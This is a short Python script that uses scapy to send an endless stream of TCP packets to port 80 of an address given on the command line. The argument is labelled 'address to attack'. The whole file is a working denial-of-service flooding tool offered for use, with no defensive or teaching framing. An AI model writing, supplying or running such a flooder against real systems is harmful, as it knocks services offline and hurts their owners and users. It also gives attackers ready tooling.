import socket
from scapy.all import IP, TCP, send
from subprocess import check_output

import argparse


def attack_code(target_ip):
    # get the IP address of the host first
    ips = check_output(['hostname', '--all-ip-addresses']).strip()
    source_ip = ips.decode('utf-8')
    source_port = 80

    print(source_ip)
    print(target_ip)

    if source_ip == target_ip:
        return

    i = 1
    while True:
        IP1 = IP(src=source_ip, dst=target_ip)
        TCP1 = TCP(sport=source_port, dport=80)
        pkt = IP1 / TCP1
        send(pkt, inter=.00000001)

        i = i + 1


def main():
    parser = argparse.ArgumentParser()

    parser.add_argument('address', help='address to attack', type=str)
    args = parser.parse_args()

    attack_code(args.address)


if __name__ == "__main__":
    main()
